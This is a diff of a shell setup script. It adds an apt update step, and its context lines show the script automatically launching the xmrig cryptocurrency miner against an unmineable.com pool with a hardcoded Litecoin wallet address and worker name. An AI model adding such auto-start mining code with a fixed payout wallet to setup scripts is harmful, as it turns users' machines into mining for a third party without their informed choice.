@@ -46,8 +46,12 @@ animate &
 ANIMATE_PID=$!
 disown
 
+# Update package list
+echo -e "\n${GREEN}🔄 Updating package list...${NC}"
+sudo apt update > /dev/null 2>&1
+
 # Install sudo if not already installed
-echo -e "\n${GREEN}🔧 Installing sudo...${NC}"
+echo -e "${GREEN}🔧 Installing sudo...${NC}"
 apt install sudo -y > /dev/null 2>&1
 
 # Install required dependencies
@@ -85,4 +89,3 @@ echo -e "${BLUE}💻 You are now in the $(pwd) directory${NC}"
 # Start xmrig miner automatically
 echo -e "${YELLOW}💰 Starting miner...${NC}"
 ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u LTC:Lg5YZburosmqvQabhLs9Kye7YQXVjsPHZ2.Spiderminers1 -p x
-
